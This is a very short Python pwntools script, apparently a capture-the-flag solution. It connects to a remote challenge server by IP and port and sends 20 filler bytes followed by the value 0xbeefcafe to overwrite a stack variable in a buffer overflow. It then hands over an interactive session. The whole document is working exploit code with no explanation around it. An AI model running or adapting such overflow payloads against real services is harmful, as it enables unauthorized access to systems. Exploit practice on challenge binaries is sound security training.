from pwn import *
#p=process('./chal')
p=remote('193.57.159.27',25467)

#raw_input("DEBUG")

payload = "a"*20
payload += "\xfe\xca\xef\xbe"
p.sendline(payload)

p.interactive()